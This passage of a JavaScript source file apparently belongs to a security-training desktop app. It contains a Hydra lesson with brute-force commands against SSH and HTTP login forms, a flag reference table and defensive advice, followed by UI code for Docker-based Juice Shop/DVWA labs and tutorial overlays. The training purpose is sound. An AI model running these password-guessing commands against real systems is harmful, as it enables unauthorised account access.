    { title: 'Using Username Lists', desc: 'Instead of a single username (<code>-l</code>), provide a file of usernames (<code>-L</code>). You can also create custom lists based on reconnaissance:', code: { lang: 'bash', text: '# Create a custom username list:\necho -e "admin\\nroot\\nadministrator\\nuser\\ntest" > users.txt\n\n# Use it with Hydra:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
    { title: 'Control Speed and Output', desc: 'Use <code>-t</code> for parallel tasks, <code>-w</code> for timeout, <code>-V</code> for verbose output (shows every attempt), and <code>-o</code> to save results:', code: { lang: 'bash', text: '# Verbose mode (see each attempt):\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -V\n\n# Save results to file:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -o results.txt\n\n# Limit to 4 threads, 30s timeout:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -t 4 -w 30' } }
  ],

  defense: [
    { title: 'Account Lockout Policies', desc: 'Lock accounts after N failed attempts (e.g., 5 within 10 minutes). This dramatically slows brute force attacks. Implement progressive delays — first lockout for 5 minutes, then 30 minutes, then require admin unlock.' },
    { title: 'Multi-Factor Authentication (MFA)', desc: 'Even if the password is guessed, the attacker still needs the second factor (TOTP code, hardware key, push notification). MFA renders brute force attacks nearly useless.' },
    { title: 'Rate Limiting', desc: 'Limit login attempts per IP address and per account. Tools like fail2ban (Linux) can automatically ban IPs that exceed threshold attempts.' },
    { title: 'Strong Password Policies', desc: 'Require minimum length (12+ characters), check against known breached password lists (like HaveIBeenPwned), and encourage passphrases over complex character requirements.' },
    { title: 'CAPTCHA', desc: 'Add CAPTCHA challenges after 2-3 failed login attempts. This stops automated tools like Hydra from submitting forms at machine speed.' },
    { title: 'Monitor and Alert', desc: 'Log all failed login attempts. Set up alerts for anomalies — e.g., 100 failed logins from the same IP, or attempts against multiple usernames from the same source.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-l USER',      'Single target username',                              'hydra -l admin ...'],
    ['-L FILE',      'Username list file',                                  'hydra -L users.txt ...'],
    ['-p PASS',      'Single target password',                              'hydra -l admin -p password123 ...'],
    ['-P FILE',      'Password list file',                                  'hydra -P rockyou.txt ...'],
    ['-t N',         'Number of parallel threads (default 16)',             'hydra ... -t 4'],
    ['-w N',         'Timeout in seconds per connection attempt',           'hydra ... -w 30'],
    ['-V',           'Verbose — show every login attempt',                  'hydra ... -V'],
    ['-v',           'Verbose mode (less detail than -V)',                  'hydra ... -v'],
    ['-o FILE',      'Save found credentials to a file',                    'hydra ... -o results.txt'],
    ['-s PORT',      'Specify a custom port number',                        'hydra ... -s 8080'],
    ['-f',           'Stop after first valid credentials found',            'hydra ... -f'],
    ['ssh://',       'Target protocol prefix for SSH',                       'hydra -l root -P list.txt ssh://target'],
    ['ftp://',       'Target protocol prefix for FTP',                       'hydra -l admin -P list.txt ftp://target'],
    ['http-post-form','HTTP POST form brute force module',                  'hydra ... http-post-form "/login:u=^USER^&p=^PASS^:F=Failed"'],
    ['http-get-form', 'HTTP GET form brute force module',                   'hydra ... http-get-form "/login:u=^USER^&p=^PASS^:F=Failed"'],
    ['-e nsr',       'Try null password, same-as-login, and reversed login','hydra ... -e nsr'],
    ['-C FILE',      'Colon-separated "user:pass" combo file',             'hydra ... -C combos.txt ssh://target']
  ]}
}

]; // end MODULES

/* ═══════════════════════════════════════════════════════════════════════════════
   APPLICATION STATE & DOM
   ═══════════════════════════════════════════════════════════════════════════════ */

let activeModuleIndex = -1;
let isBooting = false;
let dockerInstalled = null;

const sidebarNav   = document.getElementById('sidebarNav');
const contentArea  = document.getElementById('contentArea');
const btnBoot      = document.getElementById('btnBoot');
const btnBootText  = document.getElementById('btnBootText');
const labMessage   = document.getElementById('labMessage');
const labStatusRow = document.getElementById('labStatusRow');
const dockerMount  = document.getElementById('dockerWizardMount');

/* ═══════════════════════════════════════════════════════════════════════════════
   SIDEBAR NAVIGATION
   ═══════════════════════════════════════════════════════════════════════════════ */

function buildSidebar() {
  MODULES.forEach((mod, i) => {
    const item = document.createElement('div');
    item.className = 'nav-item';
    item.dataset.index = i;
    item.innerHTML = `
      <div class="nav-num">${mod.num}</div>
      <div class="nav-label">${mod.title}</div>
    `;
    item.addEventListener('click', () => selectModule(i));
    sidebarNav.appendChild(item);
  });
}

function selectModule(index) {
  activeModuleIndex = index;
  document.querySelectorAll('.nav-item').forEach((el, i) => {
    el.classList.toggle('active', i === index);
  });
  renderModule(MODULES[index]);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   MODULE RENDERER
   ═══════════════════════════════════════════════════════════════════════════════ */

function renderModule(mod) {
  contentArea.innerHTML = `
    <div class="module-header fade-in">
      <span class="module-tag">${mod.tag}</span>
      <h2 class="module-title">${mod.title}</h2>
      <p class="module-subtitle">${mod.subtitle}</p>
    </div>

    <!-- Core Concept -->
    <div class="section-card fade-in fade-in-delay-1">
      <div class="section-header">
        <div class="section-icon concept">${ICONS.concept}</div>
        <h3 class="section-title">Core Concept</h3>
      </div>
      <div class="section-body">
        ${mod.concept.map(p => `<p>${p}</p>`).join('')}
      </div>
    </div>

    <!-- Real-World Analogy -->
    <div class="section-card fade-in fade-in-delay-2">
      <div class="section-header">
        <div class="section-icon analogy">${ICONS.analogy}</div>
        <h3 class="section-title">Real-World Analogy</h3>
      </div>
      <div class="section-body">
        <div class="analogy-box">
          <span class="analogy-emoji">${mod.analogy.emoji}</span>
          <p>${mod.analogy.text}</p>
        </div>
      </div>
    </div>

    <!-- Step-by-Step Lab Exercise -->
    <div class="section-card fade-in fade-in-delay-3">
      <div class="section-header">
        <div class="section-icon exercise">${ICONS.exercise}</div>
        <h3 class="section-title">Step-by-Step Lab Exercise</h3>
      </div>
      <div class="section-body">
        <ol class="step-list">
          ${mod.steps.map((step, i) => `
            <li class="step-item">
              <div class="step-num">${i + 1}</div>
              <div class="step-content">
                <h4>${step.title}</h4>
                <p>${step.desc}</p>
                ${step.code ? buildCodeBlock(step.code.lang, step.code.text) : ''}
              </div>
            </li>
          `).join('')}
        </ol>
      </div>
    </div>

    <!-- Defense & Remediation -->
    ${mod.defense ? `
    <div class="section-card fade-in fade-in-delay-4">
      <div class="section-header">
        <div class="section-icon defense">${ICONS.defense}</div>
        <h3 class="section-title">Defense & Remediation</h3>
      </div>
      <div class="section-body">
        <ul class="defense-list">
          ${mod.defense.map(d => `
            <li class="defense-item">
              <div class="defense-icon-sm">${ICONS.shield}</div>
              <div class="defense-content">
                <h4>${d.title}</h4>
                <p>${d.desc}</p>
              </div>
            </li>
          `).join('')}
        </ul>
      </div>
    </div>
    ` : ''}

    <!-- Interactive Reference Table -->
    <div class="section-card fade-in fade-in-delay-5">
      <div class="section-header">
        <div class="section-icon reference">${ICONS.reference}</div>
        <h3 class="section-title">Interactive Reference Table</h3>
      </div>
      <div class="section-body">
        <div class="payload-table-wrap">
          <table class="payload-table">
            <thead>
              <tr>
                ${mod.payloads.headers.map(h => `<th>${h}</th>`).join('')}
                <th style="width:40px;"></th>
              </tr>
            </thead>
            <tbody>
              ${mod.payloads.rows.map(row => `
                <tr>
                  <td><span class="cell-code">${escapeHtml(row[0])}</span></td>
                  <td>${row[1]}</td>
                  <td>${formatRisk(row[2])}</td>
                  <td>
                    <button class="cell-copy-btn" data-copy="${escapeAttr(row[0])}" title="Copy">
                      ${ICONS.copy}
                    </button>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      </div>
    </div>
    
    <!-- Interactive Challenges -->
    <div class="section-card fade-in fade-in-delay-5" id="interactiveChallengesSection" style="display:none;">
      <div class="section-header" style="background: rgba(0, 240, 255, 0.05); border-bottom: 1px solid var(--border-accent);">
        <div class="section-icon concept" style="background: var(--cyan); color: #000;">🎯</div>
        <h3 class="section-title" style="color: var(--cyan);">Interactive Challenges</h3>
      </div>
      <div class="section-body">
        <p>Put your skills to the test inside the live lab environment. You can follow an interactive step-by-step tutorial, or try to solve it on your own!</p>
        <div id="challengesList" class="challenges-list" style="display: flex; flex-direction: column; gap: 12px; margin-top: 16px;">
          <!-- Populated dynamically if tutorials exist for this module -->
        </div>
      </div>
    </div>
  `;

  // After rendering, check if there are tutorials for this module
  if (window.TUTORIALS) {
    const modsTuts = Object.entries(window.TUTORIALS).filter(([key, tut]) => tut.module === mod.id);
    if (modsTuts.length > 0) {
      document.getElementById('interactiveChallengesSection').style.display = 'block';
      const list = document.getElementById('challengesList');
      list.innerHTML = modsTuts.map(([key, tut]) => `
        <div style="display:flex; align-items:center; justify-content:space-between; background:var(--bg-elevated); padding:12px 16px; border:1px solid var(--border); border-radius:var(--radius-sm);">
          <div>
            <div style="font-size:14px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">${escapeHtml(tut.name)}</div>
            <div style="font-size:12px; color:var(--text-secondary);">${escapeHtml(tut.description)}</div>
          </div>
          <div style="display:flex; gap:8px;">
            <button class="btn btn-secondary" onclick="window.__app.startChallenge('${key}')">
              Real Challenge
            </button>
            <button class="btn btn-boot" onclick="window.__app.startTutorial('${key}')" style="background: linear-gradient(135deg, var(--cyan), var(--violet)); box-shadow: 0 0 15px rgba(0,240,255,0.2);">
              Start Tutorial
            </button>
          </div>
        </div>
      `).join('');
    }
  }

  // Setup copy buttons
  attachCopyHandlers();
  contentArea.scrollTop = 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
   CODE BLOCK & COPY
   ═══════════════════════════════════════════════════════════════════════════════ */

function buildCodeBlock(lang, text) {
  const id = 'cb-' + Math.random().toString(36).substr(2, 8);
  return `
    <div class="code-wrapper">
      <div class="code-header">
        <span class="code-lang">${lang}</span>
        <button class="btn-copy" data-target="${id}" title="Copy to clipboard">
          ${ICONS.copy}
          <span>Copy</span>
        </button>
      </div>
      <pre class="code-block" id="${id}">${escapeHtml(text)}</pre>
    </div>
  `;
}

function attachCopyHandlers() {
  document.querySelectorAll('.btn-copy[data-target]').forEach(btn => {
    btn.addEventListener('click', async () => {
      const el = document.getElementById(btn.dataset.target);
      if (el) await copyToClipboard(el.textContent, btn);
    });
  });
  document.querySelectorAll('.cell-copy-btn[data-copy]').forEach(btn => {
    btn.addEventListener('click', async () => {
      await copyToClipboard(btn.dataset.copy, btn);
    });
  });
}

async function copyToClipboard(text, btnEl) {
  try {
    await navigator.clipboard.writeText(text);
    btnEl.classList.add('copied');
    const orig = btnEl.innerHTML;
    btnEl.innerHTML = btnEl.classList.contains('btn-copy')
      ? `${ICONS.check}<span>Copied!</span>`
      : ICONS.check;
    setTimeout(() => { btnEl.classList.remove('copied'); btnEl.innerHTML = orig; }, 1800);
  } catch (e) { console.error('Copy failed:', e); }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   DOCKER WIZARD
   ═══════════════════════════════════════════════════════════════════════════════ */

async function checkDockerInstallation() {
  try {
    const result = await window.labAPI.checkDocker();
    dockerInstalled = result.installed;

    if (result.installed) {
      dockerMount.innerHTML = `
        <div class="docker-success">
          ${ICONS.check}
          <span>Docker detected — ${escapeHtml(result.version)}</span>
        </div>
      `;
      setTimeout(() => { dockerMount.innerHTML = ''; }, 4000);
    } else {
      showDockerWizard(result.platform);
    }
  } catch (e) {
    showDockerWizard('unknown');
  }
}

function showDockerWizard(platform) {
  const platformName =
    platform === 'win32' ? 'Windows' :
    platform === 'darwin' ? 'macOS' : 'Linux';

  const platformSteps =
    platform === 'win32' ? `
      <li><div class="dw-num">1</div><span>Click <strong>"Download Docker Desktop"</strong> below — it opens the official installer download.</span></li>
      <li><div class="dw-num">2</div><span>Run the downloaded <strong>Docker Desktop Installer.exe</strong> and follow the prompts.</span></li>
      <li><div class="dw-num">3</div><span>Restart your computer when prompted.</span></li>
      <li><div class="dw-num">4</div><span>Launch <strong>Docker Desktop</strong> from the Start menu and wait for it to start (whale icon in system tray turns steady).</span></li>
      <li><div class="dw-num">5</div><span>Click <strong>"Re-check Docker"</strong> below to verify the installation.</span></li>
    ` : platform === 'darwin' ? `
      <li><div class="dw-num">1</div><span>Click <strong>"Download Docker Desktop"</strong> below — it downloads the DMG installer.</span></li>
      <li><div class="dw-num">2</div><span>Open the DMG and drag Docker to your Applications folder.</span></li>
      <li><div class="dw-num">3</div><span>Launch Docker from Applications and grant the necessary permissions.</span></li>
      <li><div class="dw-num">4</div><span>Wait for the Docker icon in the menu bar to show "Docker Desktop is running".</span></li>
      <li><div class="dw-num">5</div><span>Click <strong>"Re-check Docker"</strong> below to verify the installation.</span></li>
    ` : `
      <li><div class="dw-num">1</div><span>Click <strong>"Open Install Guide"</strong> — it opens the official Docker Engine install docs for your distro.</span></li>
      <li><div class="dw-num">2</div><span>Follow the instructions for your Linux distribution (Ubuntu, Debian, Fedora, etc.).</span></li>
      <li><div class="dw-num">3</div><span>Add your user to the docker group: <code>sudo usermod -aG docker $USER</code></span></li>
      <li><div class="dw-num">4</div><span>Log out and back in for group changes to take effect.</span></li>
      <li><div class="dw-num">5</div><span>Verify with <code>docker run hello-world</code>, then click <strong>"Re-check Docker"</strong> below.</span></li>
    `;

  const downloadLabel = platform === 'linux' ? 'Open Install Guide' : 'Download Docker Desktop';

  dockerMount.innerHTML = `
    <div class="docker-wizard">
      <div class="docker-wizard-header">
        <div class="docker-wizard-icon">${ICONS.docker}</div>
        <h3 class="docker-wizard-title">Docker Not Found — Setup Required</h3>
      </div>
      <p class="docker-wizard-desc">
        The Lab Control Panel requires <strong>Docker</strong> to run vulnerable target applications (Juice Shop & DVWA) locally.
        Docker is free and takes about 5 minutes to install. Detected platform: <strong>${platformName}</strong>.
      </p>
      <ul class="docker-wizard-steps">${platformSteps}</ul>
      <div class="docker-wizard-actions">
        <button class="btn btn-docker-dl" onclick="window.__app.downloadDocker()">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
          <span>${downloadLabel}</span>
        </button>
        <button class="btn btn-docker-recheck" onclick="window.__app.recheckDocker()">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
          <span>Re-check Docker</span>
        </button>
      </div>
    </div>
  `;
}

async function downloadDocker() {
  try {
    await window.labAPI.downloadDocker();
    labMessage.textContent = 'Docker download opened in your browser. Install it, then click Re-check.';
  } catch (e) {
    console.error('Download Docker error:', e);
  }
}

async function recheckDocker() {
  labMessage.textContent = 'Checking for Docker installation...';
  await checkDockerInstallation();
  if (dockerInstalled) {
    labMessage.textContent = 'Docker is installed and ready! You can now Boot the Lab.';
  } else {
    labMessage.textContent = 'Docker still not detected. Please complete the installation and try again.';
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   LAB CONTROL PANEL
   ═══════════════════════════════════════════════════════════════════════════════ */

async function handleBoot() {
  if (isBooting) return;

  if (dockerInstalled === false) {
    showError('Docker is not installed. Please follow the setup wizard above to install Docker first.');
    return;
  }

  isBooting = true;
  btnBoot.classList.add('loading');
  btnBootText.innerHTML = 'Downloading Lab Assets<span class="loading-dots"></span>';
  labMessage.textContent = 'Pulling Docker images & starting containers — this may take a few minutes on first run...';
  clearError();

  try {
    const results = await window.labAPI.bootLab();
    handleLabResults(results, 'booted');
  } catch (err) {
    showError('Unexpected error while booting the lab: ' + err.message);
  } finally {
    isBooting = false;
    btnBoot.classList.remove('loading');
    btnBootText.textContent = 'Boot Lab';
  }
}

async function handleStop() {
  const btnRestart = document.getElementById('btnRestart');
  if (btnRestart) btnRestart.style.display = 'none';

  labMessage.textContent = 'Stopping lab containers...';
  try {
    const results = await window.labAPI.stopLab();
    handleLabResults(results, 'stopped');
  } catch (err) {
    showError('Unexpected error while stopping the lab: ' + err.message);
  }
}

async function handleRestart() {
  const btnRestart = document.getElementById('btnRestart');
  if (btnRestart) {
    btnRestart.querySelector('span').textContent = 'Restarting...';
    btnRestart.classList.add('loading');
    btnRestart.disabled = true;
  }
  
  await handleStop();
  await handleBoot();
  
  if (btnRestart) {
    btnRestart.querySelector('span').textContent = 'Restart Lab';
    btnRestart.classList.remove('loading');
    btnRestart.disabled = false;
  }
}

async function handleRefresh() {
  labMessage.textContent = 'Checking container status...';
  try {
    const status = await window.labAPI.getStatus();
    updateStatusChips(status);
    labMessage.textContent = 'Status refreshed.';
  } catch (err) {
    showError('Could not check status: ' + err.message);
  }
}

function handleLabResults(results, action) {
  const errors = [];
  for (const [key, result] of Object.entries(results)) {
    if (!result.ok && result.error) {
      if (result.error === 'DOCKER_NOT_FOUND') {
        showDockerWizard('unknown');
        labMessage.textContent = 'Docker is not installed. Follow the setup wizard above.';
        return;
      }
      errors.push(`${result.label}: ${result.error}`);
    }
  }
  if (errors.length > 0) {
    showError(errors.join('\n'));
    labMessage.textContent = 'Lab encountered errors — see details below.';
  } else {
    labMessage.textContent = `Lab containers ${action} successfully.`;
    clearError();
    const btnRestart = document.getElementById('btnRestart');
    if (action === 'booted') {
      if (btnRestart) btnRestart.style.display = 'inline-flex';
      window.labAPI.openUrl('http://localhost:3000');
      // Delay second URL slightly to prevent browser from ignoring simultaneous requests
      setTimeout(() => {
        window.labAPI.openUrl('http://localhost:8080');
      }, 500);
    }
  }
  setTimeout(() => handleRefresh(), 2500);
}

function updateStatusChips(status) {
  for (const [key, info] of Object.entries(status)) {
    const chipId = key === 'juiceshop' ? 'statusJuiceshop' : 'statusDvwa';
    const chip = document.getElementById(chipId);
    if (!chip) continue;
    const dot = chip.querySelector('.status-dot');
    dot.className = 'status-dot';
    if (info.error && info.error !== 'DOCKER_NOT_FOUND') dot.classList.add('error');
    else if (info.running) dot.classList.add('online');
    else dot.classList.add('offline');
  }
}

function showError(message) {
  clearError();
  const banner = document.createElement('div');
  banner.className = 'error-banner';
  banner.id = 'labErrorBanner';
  banner.innerHTML = `
    <div class="error-banner-icon">${ICONS.error}</div>
    <div class="error-banner-text">${escapeHtml(message)}</div>
  `;
  labStatusRow.after(banner);
}

function clearError() {
  const el = document.getElementById('labErrorBanner');
  if (el) el.remove();
}

/* ═══════════════════════════════════════════════════════════════════════════════
   LAB MODE — Webview + Overlay
   ═══════════════════════════════════════════════════════════════════════════════ */

let isLabMode = false;
let labModeInitialized = false;
let overlayPanelCollapsed = false;

const labModeEl       = document.getElementById('labMode');
const contentAreaEl   = document.getElementById('contentArea');
const labPanelEl      = document.getElementById('labPanel');
const webviewEl       = document.getElementById('juiceshopView');
const webviewLoading  = document.getElementById('webviewLoading');
const btnLabModeText  = document.getElementById('btnLabModeText');
const overlayPanel    = document.getElementById('overlayPanel');
const overlayToggle   = document.getElementById('overlayToggle');

function toggleLabMode() {
  isLabMode = !isLabMode;

  if (isLabMode) {
    // Switch to Lab Mode
    contentAreaEl.style.display = 'none';
    labModeEl.style.display = 'flex';
    btnLabModeText.textContent = 'Study Mode';
    document.getElementById('btnLabMode').classList.add('active');

    // Initialize webview on first entry
    if (!labModeInitialized) {
      initLabMode();
      labModeInitialized = true;
    }
  } else {
    // Switch back to Study Mode
    labModeEl.style.display = 'none';
    contentAreaEl.style.display = '';
    btnLabModeText.textContent = 'Enter Lab Mode';
    document.getElementById('btnLabMode').classList.remove('active');
  }
}

function initLabMode() {
  // Determine absolute path to the preload script
  const preloadPath = window.location.href.replace('index.html', 'webview-preload.js');
  webviewEl.setAttribute('preload', preloadPath);

  // Load Juice Shop in the webview
  webviewEl.src = 'http://localhost:3000';

  // Show loading overlay
  webviewLoading.style.display = 'flex';

  // Hide loading when the page finishes loading
  webviewEl.addEventListener('did-finish-load', () => {
    webviewLoading.style.display = 'none';
  });

  webviewEl.addEventListener('did-fail-load', (_event) => {
    webviewLoading.querySelector('.webview-loading-text').textContent =
      'Failed to load Juice Shop. Is the lab running?';
    webviewLoading.querySelector('.webview-loading-spinner').style.display = 'none';
  });

  // Initialize the overlay system if overlay.js is loaded
  if (window.__overlay) {
    window.__overlay.init(webviewEl);
  }
}

function toggleOverlayPanel() {
  overlayPanelCollapsed = !overlayPanelCollapsed;

  if (overlayPanelCollapsed) {
    overlayPanel.classList.add('collapsed');
    overlayToggle.querySelector('svg').innerHTML = '<polyline points="9 18 15 12 9 6"/>';
  } else {
    overlayPanel.classList.remove('collapsed');
    overlayToggle.querySelector('svg').innerHTML = '<polyline points="15 18 9 12 15 6"/>';
  }
}

function startTutorial(tutorialKey) {
  if (!isLabMode) toggleLabMode();
  
  if (!window.TUTORIALS || !window.TUTORIALS[tutorialKey]) {
    alert("Tutorial not found!");
    return;
  }
  
  const tut = window.TUTORIALS[tutorialKey];
  
  const tutorialCSS = `
    #cyber-tut-backdrop {
      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.65); z-index: 999990;
      pointer-events: none;
      display: block; transition: clip-path 0.4s ease;
    }
    #cyber-tut-bubble {
      position: fixed; z-index: 999999;
      background: linear-gradient(135deg, rgba(10, 14, 23, 0.97), rgba(17, 24, 39, 0.97));
      border: 2px solid rgba(0, 240, 255, 0.5);
      border-radius: 12px; padding: 20px 24px;
      color: #e2e8f0; font-family: 'Inter', 'Segoe UI', sans-serif;
      font-size: 14px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.6), 0 0 30px rgba(0,240,255,0.15);
      max-width: 340px; min-width: 240px;
      pointer-events: auto;
    }
    #cyber-tut-bubble .tut-step-badge {
      display: inline-block; font-weight: 700; color: #00f0ff;
      font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px;
      margin-bottom: 10px; padding: 3px 8px;
      background: rgba(0,240,255,0.1); border-radius: 4px;
    }
    #cyber-tut-bubble .tut-text {
      line-height: 1.6; font-size: 14px; color: #cbd5e1;
    }
    #cyber-tut-bubble .tut-skip-btn {
      margin-top: 14px; display: flex; gap: 8px;
    }
    #cyber-tut-bubble .tut-btn {
      flex: 1; padding: 8px 12px; border-radius: 6px; cursor: pointer;
      font-size: 12px; font-weight: 600; text-align: center; border: none;
      transition: all 0.15s ease;
    }
    #cyber-tut-bubble .tut-btn-primary {
      background: rgba(0,240,255,0.15); border: 1px solid #00f0ff; color: #00f0ff;
    }
    #cyber-tut-bubble .tut-btn-primary:hover { background: rgba(0,240,255,0.25); }
    #cyber-tut-bubble .tut-btn-secondary {
      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.15); color: #94a3b8;
    }
    #cyber-tut-bubble .tut-btn-secondary:hover { background: rgba(255,255,255,0.1); color: #e2e8f0; }
    .cyber-tut-highlight {
      position: relative !important; z-index: 999995 !important;
      box-shadow: 0 0 0 4px rgba(0,240,255,0.4), 0 0 20px rgba(0,240,255,0.2) !important;
      border-radius: 4px;
    }
    #cyber-tut-arrow {
      position: fixed; z-index: 999998;
      width: 0; height: 0; pointer-events: none;
    }
  `;
  
  const tutorialEngineCode = `
(function() {
  if (window.__cyberTutorialEngine) {
    window.__cyberTutorialEngine.play(${JSON.stringify(tut.steps)});
    return;
  }

  var backdrop = document.createElement('div');
  backdrop.id = 'cyber-tut-backdrop';
  document.body.appendChild(backdrop);

  var bubble = document.createElement('div');
  bubble.id = 'cyber-tut-bubble';
  bubble.style.display = 'none';
  document.body.appendChild(bubble);

  var engine = {
    steps: [],
    current: 0,
    retryCount: 0,
    maxRetries: 20,
    active: false,

    play: function(steps) {
      this.steps = steps;
      this.current = 0;
      this.active = true;
      this.retryCount = 0;
      backdrop.style.display = 'block';
      this.showStep();
    },

    stop: function() {
      this.active = false;
      backdrop.style.display = 'none';
      bubble.style.display = 'none';
      this.clearHighlight();
    },

    clearHighlight: function() {
      var els = document.querySelectorAll('.cyber-tut-highlight');
      for (var i = 0; i < els.length; i++) {
        els[i].classList.remove('cyber-tut-highlight');
      }
      backdrop.style.clipPath = 'none';
    },

    showStep: function() {
      var self = this;
      if (this.current >= this.steps.length) {
        bubble.innerHTML = '<div class="tut-step-badge">Tutorial Complete!</div>' +
          '<div class="tut-text">Congratulations! You have completed the tutorial.</div>' +
          '<div class="tut-skip-btn"><button class="tut-btn tut-btn-primary" id="tut-done-btn">Done</button></div>';
        bubble.style.display = 'block';
        bubble.style.top = '50%';
        bubble.style.left = '50%';
        bubble.style.transform = 'translate(-50%, -50%)';
        document.getElementById('tut-done-btn').onclick = function() { self.stop(); };
        return;
      }

      var step = this.steps[this.current];
      this.clearHighlight();

      var target = null;
      if (step.selector === 'body') {
        target = document.body;
      } else {
        target = document.querySelector(step.selector);
      }

      if (!target) {
        this.retryCount++;
        if (this.retryCount < this.maxRetries) {
          setTimeout(function() { self.showStep(); }, 500);
        } else {
          this.retryCount = 0;
          this.current++;
          this.showStep();
        }
        return;
      }
      this.retryCount = 0;

      if (target !== document.body) {
        target.classList.add('cyber-tut-highlight');
        target.scrollIntoView({ behavior: 'smooth', block: 'center' });

        setTimeout(function() {
          var rect = target.getBoundingClientRect();
          var pad = 6;
          var top = rect.top - pad, left = rect.left - pad;
          var right = rect.right + pad, bottom = rect.bottom + pad;
          backdrop.style.clipPath = 'polygon(' +
            '0% 0%, 0% 100%, ' +
            left + 'px 100%, ' +
            left + 'px ' + top + 'px, ' +
            right + 'px ' + top + 'px, ' +
            right + 'px ' + bottom + 'px, ' +
            left + 'px ' + bottom + 'px, ' +
            left + 'px 100%, ' +
            '100% 100%, 100% 0%)';
        }, 100);
      } else {
        backdrop.style.clipPath = 'none';
      }

      // Render bubble content
      bubble.style.transform = 'none';
      bubble.innerHTML =
        '<div class="tut-step-badge">Step ' + (this.current + 1) + ' of ' + this.steps.length + '</div>' +
        '<div class="tut-text">' + step.text + '</div>' +
        '<div class="tut-skip-btn">' +
          '<button class="tut-btn tut-btn-secondary" id="tut-skip-btn">Skip</button>' +
          '<button class="tut-btn tut-btn-primary" id="tut-next-btn">Next</button>' +
        '</div>';
      bubble.style.display = 'block';

      document.getElementById('tut-skip-btn').onclick = function() { self.stop(); };
      document.getElementById('tut-next-btn').onclick = function() { self.advance(); };

      // Position the bubble near the target
      setTimeout(function() {
        var tRect = target.getBoundingClientRect();
        var bRect = bubble.getBoundingClientRect();

        var bTop, bLeft;
        var pos = step.position || 'bottom';

        if (target === document.body || pos === 'center') {
          bTop = window.innerHeight / 2 - bRect.height / 2;
          bLeft = window.innerWidth / 2 - bRect.width / 2;
        } else if (pos === 'right') {
          bTop = tRect.top;
          bLeft = tRect.right + 14;
        } else if (pos === 'left') {
          bTop = tRect.top;
          bLeft = tRect.left - bRect.width - 14;
        } else if (pos === 'top') {
          bTop = tRect.top - bRect.height - 14;
          bLeft = tRect.left;
        } else {
          // bottom (default)
          bTop = tRect.bottom + 14;
          bLeft = tRect.left;
        }

        // Clamp to viewport
        if (bLeft + bRect.width > window.innerWidth - 10) bLeft = window.innerWidth - bRect.width - 10;
        if (bTop + bRect.height > window.innerHeight - 10) bTop = tRect.top - bRect.height - 14;
        if (bLeft < 10) bLeft = 10;
        if (bTop < 10) bTop = 10;

        bubble.style.top = bTop + 'px';
        bubble.style.left = bLeft + 'px';
      }, 150);

      // Also listen for user performing the action to auto-advance
      if (step.action === 'click' && target !== document.body) {
        var clickHandler = function() {
          target.removeEventListener('click', clickHandler);
          self.advance();
        };
        target.addEventListener('click', clickHandler);
      }
    },

    advance: function() {
      this.current++;
      this.retryCount = 0;
      this.showStep();
    }
  };

  window.__cyberTutorialEngine = engine;
  engine.play(${JSON.stringify(tut.steps)});
})();
`;

  const play = () => {
    // If the first step has a hash, navigate there first
    if (tut.steps[0] && tut.steps[0].hash) {
      webviewEl.executeJavaScript(`window.location.hash = '${tut.steps[0].hash}';`);
      // Give Juice Shop a moment to route, then inject
      setTimeout(() => {
        webviewEl.executeJavaScript(tutorialEngineCode);
      }, 1500);
    } else {
      webviewEl.executeJavaScript(tutorialEngineCode);
    }
  };

  if (webviewLoading.style.display === 'flex') {
    webviewEl.addEventListener('did-finish-load', play, { once: true });
  } else {
    play();
  }
}

function startChallenge(tutorialKey) {
  if (!isLabMode) toggleLabMode();
  
  if (!window.TUTORIALS || !window.TUTORIALS[tutorialKey]) return;
  const tut = window.TUTORIALS[tutorialKey];
  
  // Navigate if the first step has a hash, but don't play tutorial
  if (tut.steps[0] && tut.steps[0].hash) {
    const go = () => {
      webviewEl.executeJavaScript(`window.location.hash = '${tut.steps[0].hash}';`);
    };
    if (webviewLoading.style.display === 'flex') {
      webviewEl.addEventListener('did-finish-load', go, { once: true });
    } else {
      go();
    }
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   UTILITIES
   ═══════════════════════════════════════════════════════════════════════════════ */

function escapeHtml(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function escapeAttr(str) {
  return str.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function formatRisk(risk) {
  if (!risk) return '';
  const c = risk.toLowerCase();
  if (c === 'high')   return `<span class="risk-high">${risk}</span>`;
  if (c === 'medium') return `<span class="risk-medium">${risk}</span>`;
  if (c === 'low')    return `<span class="risk-low">${risk}</span>`;
  return risk;
}

/* ═══════════════════════════════════════════════════════════════════════════════
   EXPOSE & INITIALIZE
   ═══════════════════════════════════════════════════════════════════════════════ */

window.__app = {
  handleBoot,
  handleStop,
  handleRestart,
  handleRefresh,
  downloadDocker,
  recheckDocker,
  toggleLabMode,
  toggleOverlayPanel,
  startTutorial,
  startChallenge
};

window.TUTORIALS = {};
